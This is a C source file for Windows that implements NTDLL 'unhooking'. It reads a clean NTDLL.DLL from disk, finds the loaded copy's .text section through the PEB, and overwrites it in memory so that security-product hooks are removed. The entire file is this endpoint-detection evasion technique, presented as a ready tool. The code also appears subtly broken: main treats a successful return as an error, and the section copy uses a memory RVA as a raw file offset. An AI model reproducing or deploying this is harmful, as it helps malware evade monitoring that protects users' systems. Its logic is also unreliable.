#include <Windows.h>
#include <winternl.h>

main(){

    LPCSTR lpFileName = "C:\\Windows\\System32\\NTDLL.DLL";
    
    PBYTE pNtdllUnhooked;
    PVOID dwTextAddressUnhooked;
    SIZE_T dwTextSizeUnhooked;

    DWORD dwTextAddressHooked;
    DWORD dwTextSizeHooked;
    DWORD dwNtdllHookedSize;
    PBYTE pNtdllHooked;
    PVOID pAddressNtdllHooked;

    PVOID pNtdllTxtHooked;
    SIZE_T sNtdllTxtHooked;

    printf("[*] Retrieving Buffer from Ntdll...\n");

    if(!RetrieveBufferFileDisk(lpFileName, &pNtdllUnhooked)){
        printf("[!] Error: %lu", GetLastError());
        return -1;
    }
    printf("[+] Received bytes From NTDLL Unhooked in Disk.\n\n");
    printf("[i] Getting .text section from NTDLL Unhooked...\n");

    if(!GetTextSectionUnhooked(pNtdllUnhooked, &dwTextAddressUnhooked, &dwTextSizeUnhooked)){
        printf("[!] Get .text section failed with error: %lu", GetLastError());
        return -1;
    }
    printf("\t[*] .text Address from Ntdll Unhooked: 0x%p\n", dwTextAddressUnhooked);
    printf("\t[*] .text Size from Ntdll Unhooked: %zu bytes\n\n", dwTextSizeUnhooked);
    
    printf("[i] Fetching Base Address to NTDLL Hooked...");

    FetchNtdllBaseAddresHooked(&pAddressNtdllHooked);
    if(pAddressNtdllHooked == INVALID_HANDLE_VALUE){
        printf("[!] Error: %lu", GetLastError());
    }
    printf("DONE\n");

    printf("[i] Getting .text section from Ntdll Hooked...\n");

    GetTextSectionHooked(pAddressNtdllHooked, &pNtdllTxtHooked, &sNtdllTxtHooked);

    printf("\t[*] .text Address from Ntdll Hooked: 0x%p\n", pNtdllTxtHooked);
    printf("\t[*] .text Size from Ntdll Hooked: %zu bytes\n\n", sNtdllTxtHooked);

    if(ReplaceNtdll(pAddressNtdllHooked, sNtdllTxtHooked, dwTextAddressUnhooked)){
        printf("Error: %lu", GetLastError());
        return -1;
    }

    printf("[+] Replaced Text in NTDLL...");

    return 0;
}

BOOL RetrieveBufferFileDisk(IN LPCSTR lpFileName, OUT PVOID* pFileBuffer){

    DWORD dwFileSize;
    PVOID pFileBuff;
    DWORD dwNumberOfBytesRead;
    HANDLE hFile;

    hFile = CreateFileA(lpFileName, GENERIC_READ, FILE_SHARE_READ , NULL, OPEN_EXISTING , FILE_ATTRIBUTE_NORMAL, NULL);
    if(hFile == INVALID_HANDLE_VALUE){
        return FALSE;
    }

    dwFileSize = GetFileSize(hFile, NULL);
    pFileBuff = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, dwFileSize);

	if (!ReadFile(hFile, pFileBuff, dwFileSize, &dwNumberOfBytesRead, NULL) || dwFileSize != dwNumberOfBytesRead) {
		printf("[!] ReadFile Failed With Error : %d \n", GetLastError());
		printf("[i] Read %d of %d Bytes \n", dwNumberOfBytesRead, dwFileSize);
		return FALSE;
	}

    *pFileBuffer = pFileBuff;

    CloseHandle(hFile);
    return TRUE;
}

BOOL GetTextSectionUnhooked(IN PBYTE pPE, OUT PVOID* pTextAddressUnhooked, OUT SIZE_T* szTextSizeUnhooked){

    PVOID textAddress;
    SIZE_T textSize;

    PIMAGE_DOS_HEADER pImageDosHdr = (PIMAGE_DOS_HEADER)pPE;
    PIMAGE_NT_HEADERS pImageNtHdrs = (PIMAGE_NT_HEADERS)((PBYTE)pPE + pImageDosHdr->e_lfanew);
    PIMAGE_SECTION_HEADER pImageSectionHdr = (PIMAGE_SECTION_HEADER)(((PBYTE)pImageNtHdrs) + sizeof(IMAGE_NT_HEADERS));

    textAddress = (PVOID)(pImageNtHdrs->OptionalHeader.BaseOfCode + (ULONG_PTR)pPE);
    textSize = pImageNtHdrs->OptionalHeader.SizeOfCode;
/*
    for (int i = 0; i < pImageNtHdrs->FileHeader.NumberOfSections; i++) {
        if (strcmp((char*)pImageSectionHdr[i].Name, ".text") == 0) {
            textAddress = pImageSectionHdr[i].VirtualAddress;
            textSize = pImageSectionHdr[i].Misc.VirtualSize;

            break;  
        }
    }
*/
    *pTextAddressUnhooked = textAddress;
    *szTextSizeUnhooked = textSize;

    return TRUE;
}

BOOL FetchNtdllBaseAddresHooked(OUT PVOID* pDllBase ){

#ifdef _WIN64
	PPEB pPEB = (PPEB)__readgsqword(0x60);
#elif _WIN32
	PPEB pPEB = (PPEB)__readfsdword(0x30);
#endif // _WIN64

	PLDR_DATA_TABLE_ENTRY pLdr = (PLDR_DATA_TABLE_ENTRY)((PBYTE)pPEB->Ldr->InMemoryOrderModuleList.Flink->Flink - 0x10);

	*pDllBase = pLdr->DllBase;
    
    return TRUE;

}

BOOL GetTextSectionHooked(IN PVOID pLocalNtdll, OUT PVOID* pNtdllHookedTxt, OUT SIZE_T* sNtdllHookedTxtSz){
    PIMAGE_DOS_HEADER	pLocalDosHdr	= (PIMAGE_DOS_HEADER)pLocalNtdll;
    if (pLocalDosHdr->e_magic != IMAGE_DOS_SIGNATURE)
        return FALSE;

    PIMAGE_NT_HEADERS 	pLocalNtHdrs	= (PIMAGE_NT_HEADERS)((PBYTE)pLocalNtdll + pLocalDosHdr->e_lfanew);
    if (pLocalNtHdrs->Signature != IMAGE_NT_SIGNATURE) 
        return FALSE;

    PVOID	pLocalNtdllTxt	= (PVOID)(pLocalNtHdrs->OptionalHeader.BaseOfCode + (ULONG_PTR)pLocalNtdll);
    SIZE_T	sNtdllTxtSize	= pLocalNtHdrs->OptionalHeader.SizeOfCode;	

    *pNtdllHookedTxt = pLocalNtdllTxt;
    *sNtdllHookedTxtSz = sNtdllTxtSize;

    return TRUE;
}

BOOL ReplaceNtdll(IN PVOID pTextOriginalNtdll, SIZE_T sTextOriginalNtdll, IN PVOID pTextUnhookedNtdll){

    DWORD dwOldProtection;

	if (!VirtualProtect(pTextOriginalNtdll, sTextOriginalNtdll, PAGE_EXECUTE_WRITECOPY, &dwOldProtection)) {
		printf("[!] VirtualProtect [1] Failed With Error : %d \n", GetLastError());
		return FALSE;
	}

	// copying the new text section 
	memcpy(pTextOriginalNtdll, pTextUnhookedNtdll, sTextOriginalNtdll);
	
	// rrestoring the old memory protection
	if (!VirtualProtect(pTextOriginalNtdll, sTextOriginalNtdll, dwOldProtection, &dwOldProtection)) {
		printf("[!] VirtualProtect [2] Failed With Error : %d \n", GetLastError());
		return FALSE;
	}

    return TRUE;
}